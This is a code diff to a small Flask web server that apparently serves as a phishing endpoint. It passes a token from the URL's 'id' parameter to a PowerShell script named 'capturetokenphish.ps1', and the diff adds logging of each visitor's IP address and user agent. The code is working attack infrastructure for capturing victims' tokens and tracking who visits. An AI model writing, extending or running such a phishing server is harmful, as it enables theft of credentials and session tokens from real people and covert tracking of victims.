@@ -1,11 +1,18 @@
 from flask import Flask, request
 import argparse
 from subprocess import call
+import logging
+
 
 app = Flask(__name__)
 
+logging.basicConfig(filename="visit_log.log",level=logging.INFO)
+
 @app.route("/", methods=['GET'])
 def hello():
+    ip_addr = request.remote_addr
+    user_agent = request.user_agent
+    app.logger.info('User From: ' + ip_addr + " with UserAgent: " + str(user_agent))
     token = request.args.get("id")
     if token:
         print(call(["/opt/microsoft/powershell/7/pwsh", "./capturetokenphish.ps1", token]))
